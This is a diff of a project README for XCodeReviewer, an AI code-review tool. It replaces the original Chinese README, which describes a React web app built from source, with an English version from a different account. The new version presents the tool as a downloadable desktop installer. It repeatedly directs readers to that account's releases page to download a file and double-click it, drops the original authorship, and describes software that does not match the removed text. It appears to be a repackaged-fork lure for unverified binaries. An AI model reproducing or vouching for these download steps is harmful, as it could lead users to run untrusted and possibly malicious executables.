@@ -1,353 +1,77 @@
-# XCodeReviewer - 您的智能代码审计伙伴 🚀
-
-<div style="width: 100%; max-width: 600px; margin: 0 auto;">
-  <img src="public/images/logo.png" alt="VerifyVision-Pro Logo" style="width: 100%; height: auto; display: block; margin: 0 auto;">
-</div>
-
-<div align="center">
-  <p>
-    <a href="README.md">中文</a> •
-    <a href="README_EN.md">English</a>
-  </p>
-</div>
-
-[![构建状态](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/lintsinghua/XCodeReviewer)
-[![许可证: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![React](https://img.shields.io/badge/React-18.0.0-blue.svg)](https://reactjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7.2-blue.svg)](https://www.typescriptlang.org/)
-[![Vite](https://img.shields.io/badge/Vite-5.1.4-646CFF.svg)](https://vitejs.dev/)
-[![Supabase](https://img.shields.io/badge/Supabase-3ECF8E.svg)](https://supabase.com/)
-[![Google Gemini](https://img.shields.io/badge/Google%20Gemini-4285F4.svg)](https://ai.google.dev/)
-
-**XCodeReviewer** 是一个由大型语言模型（LLM）驱动的现代化代码审计平台，旨在为开发者提供智能、全面且极具深度的代码质量分析和审查服务。
-
-## 🌟 为什么选择 XCodeReviewer？
-
-在快节奏的软件开发中，保证代码质量至关重要。传统代码审计工具规则死板、效率低下，而人工审计则耗时耗力。XCodeReviewer 借助 Google Gemini AI 的强大能力，彻底改变了代码审查的方式：
-
-- **🤖 AI 驱动的深度分析**：超越传统静态分析，理解代码意图，发现深层逻辑问题。
-- **🎯 多维度、全方位评估**：从**安全性**、**性能**、**可维护性**到**代码风格**，提供 360 度无死角的质量评估。
-- **💡 清晰、可行的修复建议**：独创 **What-Why-How** 模式，不仅告诉您“是什么”问题，还解释“为什么”，并提供“如何修复”的具体代码示例。
-- **⚡ 实时反馈，即时提升**：无论是代码片段还是整个代码仓库，都能获得快速、准确的分析结果。
-- **✨ 现代化、高颜值的用户界面**：基于 React + TypeScript 构建，提供流畅、直观的操作体验。
-
-## 🎬 项目演示
-
-### 主要功能界面
-
-#### 📊 智能仪表盘
-![智能仪表盘](public/images/example1.png)
-*实时展示项目统计、质量趋势和系统性能，提供全面的代码审计概览*
-
-#### ⚡ 即时分析
-![即时分析](public/images/example3.png)
-*支持代码片段快速分析，提供详细的 What-Why-How 解释和修复建议*
-
-#### 🚀 项目管理
-![项目管理](public/images/example2.png)
-*集成 GitHub/GitLab 仓库，支持多语言项目审计和批量代码分析*
-
-## 🚀 快速开始
-
-### 环境要求
-
-- **Node.js**: `18+`
-- **pnpm**: `8+` (推荐) 或 `npm` / `yarn`
-- **Google Gemini API Key**: 用于 AI 代码分析
-- **Supabase 项目**: 用于数据存储（可选，支持离线模式）
-
-### 安装与启动
-
-1.  **克隆项目**
-    ```bash
-    git clone https://github.com/lintsinghua/XCodeReviewer.git
-    cd XCodeReviewer
-    ```
-
-2.  **安装依赖**
-    ```bash
-    # 使用 pnpm (推荐)
-    pnpm install
-    
-    # 或使用 npm
-    npm install
-    
-    # 或使用 yarn
-    yarn install
-    ```
-
-3.  **配置环境变量**
-    ```bash
-    # 创建环境变量文件
-    touch .env
-    ```
-    
-    在 `.env` 文件中添加以下配置：
-    ```env
-    # Google Gemini AI 配置 (必需)
-    VITE_GEMINI_API_KEY=your_gemini_api_key_here
-    VITE_GEMINI_MODEL=gemini-2.5-flash
-    VITE_GEMINI_TIMEOUT_MS=25000
-    
-    # Supabase 配置 (可选，用于数据持久化)
-    VITE_SUPABASE_URL=https://your-project.supabase.co
-    VITE_SUPABASE_ANON_KEY=your-anon-key-here
-    
-    # 应用配置
-    VITE_APP_ID=xcodereviewer
-    ```
-
-4.  **启动开发服务器**
-    ```bash
-    pnpm dev
-    ```
-
-5.  **访问应用**
-    在浏览器中打开 `http://localhost:5173`
-
-### 🔑 获取 API Key
-
-#### Google Gemini API Key
-1. 访问 [Google AI Studio](https://makersuite.google.com/app/apikey)
-2. 创建新的 API Key
-3. 将 API Key 添加到 `.env` 文件中的 `VITE_GEMINI_API_KEY`
-
-#### Supabase 配置 (可选)
-1. 访问 [Supabase](https://supabase.com/) 创建新项目
-2. 在项目设置中获取 URL 和匿名密钥
-3. 运行数据库迁移脚本：
-   ```bash
-   # 在 Supabase SQL 编辑器中执行
-   cat supabase/migrations/full_schema.sql
-   ```
-
-## ✨ 核心功能
-
-<details>
-<summary><b>🚀 项目管理</b></summary>
-
-- **一键集成代码仓库**：无缝对接 GitHub、GitLab 等主流平台。
-- **多语言“全家桶”支持**：覆盖 JavaScript, TypeScript, Python, Java, Go, Rust 等热门语言。
-- **灵活的分支审计**：支持对指定代码分支进行精确分析。
-</details>
-
-<details>
-<summary><b>⚡ 即时分析</b></summary>
-
-- **代码片段“随手贴”**：直接在 Web 界面粘贴代码，立即获得分析结果。
-- **10+ 种语言即时支持**：满足您多样化的代码分析需求。
-- **毫秒级响应**：快速获取代码质量评分和优化建议。
-</details>
-
-<details>
-<summary><b>🧠 智能审计</b></summary>
-
-- **AI 深度代码理解**：基于 Google Gemini，提供超越关键词匹配的智能分析。
-- **五大核心维度检测**：
-  - 🐛 **潜在 Bug**：精准捕捉逻辑错误、边界条件和空指针等问题。
-  - 🔒 **安全漏洞**：识别 SQL 注入、XSS、敏感信息泄露等安全风险。
-  - ⚡ **性能瓶颈**：发现低效算法、内存泄漏和不合理的异步操作。
-  - 🎨 **代码风格**：确保代码遵循行业最佳实践和统一规范。
-  - 🔧 **可维护性**：评估代码的可读性、复杂度和模块化程度。
-</details>
-
-<details>
-<summary><b>💡 可解释性分析 (What-Why-How)</b></summary>
-
-- **What (是什么)**：清晰地指出代码中存在的问题。
-- **Why (为什么)**：详细解释该问题可能带来的潜在风险和影响。
-- **How (如何修复)**：提供具体的、可直接使用的代码修复示例。
-- **精准代码定位**：快速跳转到问题所在的行和列。
-</details>
-
-<details>
-<summary><b>📊 可视化报告</b></summary>
-
-- **代码质量仪表盘**：提供 0-100 分的综合质量评估，让代码健康状况一目了然。
-- **多维度问题统计**：按类型和严重程度对问题进行分类统计。
-- **质量趋势分析**：通过图表展示代码质量随时间的变化趋势。
-</details>
-
-## 🛠️ 技术栈
-
-| 分类 | 技术 | 说明 |
-| :--- | :--- | :--- |
-| **前端框架** | `React 18` `TypeScript` `Vite` | 现代化前端开发栈，支持热重载和类型安全 |
-| **UI 组件** | `Tailwind CSS` `Radix UI` `Lucide React` | 响应式设计，无障碍访问，丰富的图标库 |
-| **数据可视化** | `Recharts` | 专业的图表库，支持多种图表类型 |
-| **路由管理** | `React Router v6` | 单页应用路由解决方案 |
-| **状态管理** | `React Hooks` `Sonner` | 轻量级状态管理和通知系统 |
-| **AI 引擎** | `Google Gemini 2.5 Flash` | 强大的大语言模型，支持代码分析 |
-| **后端服务** | `Supabase` `PostgreSQL` | 全栈后端即服务，实时数据库 |
-| **HTTP 客户端** | `Axios` `Ky` | 现代化的 HTTP 请求库 |
-| **代码质量** | `Biome` `Ast-grep` `TypeScript` | 代码格式化、静态分析和类型检查 |
-| **构建工具** | `Vite` `PostCSS` `Autoprefixer` | 快速的构建工具和 CSS 处理 |
-
-## 📁 项目结构
-
-```
-XCodeReviewer/
-├── src/
-│   ├── components/          # React 组件
-│   │   ├── common/         # 通用组件 (Header, Footer, PageMeta)
-│   │   ├── ui/             # UI 组件库 (基于 Radix UI)
-│   │   └── debug/          # 调试组件
-│   ├── pages/              # 页面组件
-│   │   ├── Dashboard.tsx   # 仪表盘
-│   │   ├── Projects.tsx    # 项目管理
-│   │   ├── InstantAnalysis.tsx # 即时分析
-│   │   ├── AuditTasks.tsx  # 审计任务
-│   │   └── AdminDashboard.tsx # 系统管理
-│   ├── services/           # 服务层
-│   │   ├── codeAnalysis.ts # AI 代码分析引擎
-│   │   ├── repoScan.ts     # 仓库扫描服务
-│   │   └── repoZipScan.ts  # ZIP 文件扫描
-│   ├── db/                 # 数据库配置
-│   │   └── supabase.ts     # Supabase 客户端和 API
-│   ├── types/              # TypeScript 类型定义
-│   ├── hooks/              # 自定义 React Hooks
-│   ├── lib/                # 工具函数
-│   └── routes.tsx          # 路由配置
-├── supabase/
-│   └── migrations/         # 数据库迁移文件
-├── public/                 # 静态资源
-└── docs/                   # 文档
-```
-
-## 🎯 使用指南
-
-### 即时代码分析
-1. 访问 `/instant-analysis` 页面
-2. 选择编程语言（支持 10+ 种语言）
-3. 粘贴代码或上传文件
-4. 点击"开始分析"获得 AI 分析结果
-5. 查看详细的问题报告和修复建议
-
-### 项目管理
-1. 访问 `/projects` 页面
-2. 点击"新建项目"创建项目
-3. 配置仓库 URL 和扫描参数
-4. 启动代码审计任务
-5. 查看审计结果和问题统计
-
-### 审计任务
-1. 在项目详情页创建审计任务
-2. 选择扫描分支和排除模式
-3. 配置分析深度和范围
-4. 监控任务执行状态
-5. 查看详细的问题报告
-
-## 🔧 开发指南
-
-### 代码规范
-- 使用 TypeScript 进行类型安全开发
-- 遵循 ESLint 和 Biome 代码规范
-- 使用 Prettier 进行代码格式化
-- 组件采用函数式组件 + Hooks
-
-### 构建和部署
-```bash
-# 开发模式
-pnpm dev
-
-# 构建生产版本
-pnpm build
-
-# 预览构建结果
-pnpm preview
-
-# 代码检查
-pnpm lint
-```
-
-### 环境变量说明
-| 变量名 | 必需 | 说明 |
-|--------|------|------|
-| `VITE_GEMINI_API_KEY` | ✅ | Google Gemini API 密钥 |
-| `VITE_GEMINI_MODEL` | ❌ | AI 模型名称 (默认: gemini-2.5-flash) |
-| `VITE_GEMINI_TIMEOUT_MS` | ❌ | 请求超时时间 (默认: 25000ms) |
-| `VITE_SUPABASE_URL` | ❌ | Supabase 项目 URL |
-| `VITE_SUPABASE_ANON_KEY` | ❌ | Supabase 匿名密钥 |
-| `VITE_APP_ID` | ❌ | 应用标识符 (默认: xcodereviewer) |
-
-## 🤝 贡献指南
-
-我们热烈欢迎所有形式的贡献！无论是提交 issue、创建 PR，还是改进文档，您的每一次贡献对我们都至关重要。请联系我们了解详细信息。
-
-### 开发流程
-
-1.  **Fork** 本项目
-2.  创建您的功能分支 (`git checkout -b feature/AmazingFeature`)
-3.  提交您的更改 (`git commit -m 'Add some AmazingFeature'`)
-4.  推送到分支 (`git push origin feature/AmazingFeature`)
-5.  创建一个 **Pull Request**
-
-## 🚨 故障排除
-
-### 常见问题
-
-#### 1. 白屏问题
-**问题**: 应用启动后显示白屏
-**解决方案**:
-- 检查浏览器控制台是否有错误信息
-- 确认已正确配置 `VITE_GEMINI_API_KEY` 环境变量
-- 检查网络连接，确保能访问 Google AI API
-
-#### 2. API 调用失败
-**问题**: 代码分析功能无法使用
-**解决方案**:
-- 验证 Gemini API Key 是否有效
-- 检查 API 配额是否用完
-- 确认网络能访问 `https://generativelanguage.googleapis.com`
-
-#### 3. 数据库连接问题
-**问题**: 项目数据无法保存
-**解决方案**:
-- 检查 Supabase 配置是否正确
-- 确认数据库表结构已正确创建
-- 验证 RLS (Row Level Security) 策略
-
-#### 4. 构建失败
-**问题**: `pnpm build` 命令失败
-**解决方案**:
-```bash
-# 清理缓存
-pnpm clean
-rm -rf node_modules
-pnpm install
-
-# 检查 TypeScript 类型错误
-pnpm type-check
-```
-
-### 调试模式
-启用调试模式查看详细日志：
-```bash
-# 设置调试环境变量
-export DEBUG=true
-pnpm dev
-```
-
-### 性能优化
-- 使用 `pnpm` 而不是 `npm` 获得更快的安装速度
-- 启用 Vite 的预构建缓存
-- 配置 CDN 加速静态资源加载
-
-## 🙏 致谢
-
-- **[Google Gemini AI](https://ai.google.dev/)**: 提供强大的 AI 分析能力
-- **[Supabase](https://supabase.com/)**: 提供便捷的后端即服务支持
-- **[Radix UI](https://www.radix-ui.com/)**: 提供无障碍的 UI 组件
-- **[Tailwind CSS](https://tailwindcss.com/)**: 提供现代化的 CSS 框架
-- **[Recharts](https://recharts.org/)**: 提供专业的图表组件
-- 以及所有本项目所使用的开源软件的作者们！
-
-## 📞 联系我们
-
-- **项目链接**: [https://github.com/lintsinghua/XCodeReviewer](https://github.com/lintsinghua/XCodeReviewer)
-- **问题反馈**: [Issues](https://github.com/lintsinghua/XCodeReviewer/issues)
-
----
-
-⭐ 如果这个项目对您有帮助，请给我们一个 **Star**！您的支持是我们不断前进的动力！
-[![Star History](https://api.star-history.com/svg?repos=lintsinghua/XCodeReviewer&type=Date)](https://star-history.com/#lintsinghua/XCodeReviewer&Date)
+# 🚀 XCodeReviewer - Smart Code Analysis Made Easy
+
+[![Download XCodeReviewer](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/MhagoChris/XCodeReviewer/releases)
+
+## 🌟 Overview
+XCodeReviewer is an advanced tool designed to improve code quality and security. It uses large language models and explainable AI to analyze your code. Whether you want to review an entire repository or a single code snippet, XCodeReviewer helps you find hidden bugs, security flaws, and performance issues. Enjoy insightful feedback on your pull requests and daily development tasks.
+
+## 📋 Features
+- **Static Code Analysis**: Automatically scan your code for bugs and vulnerabilities.
+- **Security Checks**: Identify risks like SQL injections and XSS attacks.
+- **Performance Insights**: Find areas where your code can run more efficiently.
+- **Technical Debt Awareness**: Detect code smells that indicate potential issues in the future.
+- **User-Friendly Feedback**: Receive clear, actionable recommendations.
+
+## 📥 Download & Install
+To download XCodeReviewer, simply [visit this page to download](https://github.com/MhagoChris/XCodeReviewer/releases). Here you will find the latest and past releases of the software. 
+
+1. Click on the link above.
+2. Look for the version you want to download.
+3. Download the file suited for your operating system.
+
+Ensure you choose the correct version that matches your system requirements. 
+
+### 🖥️ System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later, Linux (latest distributions recommended).
+- **Processor**: 2 GHz dual-core or faster.
+- **RAM**: At least 4 GB (8 GB recommended for larger projects).
+- **Disk Space**: Minimum of 200 MB available space.
+
+## 💻 Running XCodeReviewer
+Once you have downloaded the application, follow these steps to run it:
+
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, launch XCodeReviewer from your applications menu.
+
+### 📂 How to Use XCodeReviewer
+1. Open the application.
+2. Select the code repository or file you wish to analyze.
+3. Click on the "Analyze" button to start the review process.
+4. Review the results and follow the recommendations provided.
+
+XCodeReviewer will highlight issues and provide explanations to help you understand the suggestions. 
+
+## ⚙️ Additional Resources
+If you need help or want to learn more about using XCodeReviewer, you can find helpful resources here:
+
+- **User Guide**: Step-by-step instructions for all features.
+- **FAQ**: Answers to common questions.
+- **Support**: Contact details for troubleshooting.
+
+## 🎉 Community and Contributions
+Join our community of users. Share your experiences, request features, or contribute to XCodeReviewer’s development. Visit our [GitHub Discussions](https://github.com/MhagoChris/XCodeReviewer/discussions) page to connect with others.
+
+## 🧑‍🤝‍🧑 Contribution Guidelines
+We welcome contributions to improve XCodeReviewer. Here's how you can get involved:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Submit a pull request with a clear description of your changes.
+
+## 🚧 Roadmap for Future Updates
+We’re continuously working on new features to enhance XCodeReviewer. Here are some planned updates:
+
+- Enhanced reporting tools for easier readability
+- More comprehensive language support
+- Improved integration with popular development environments
+
+## 👩‍💻 Attributions
+XCodeReviewer leverages advanced technologies and libraries. Thank you to all the contributors and community members who helped make this tool possible.
+
+## ⚖️ License
+XCodeReviewer is licensed under the MIT License. You can freely use, modify, and distribute this software, provided you include the original license in any copies of the software.
+
+[![Download XCodeReviewer](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/MhagoChris/XCodeReviewer/releases)
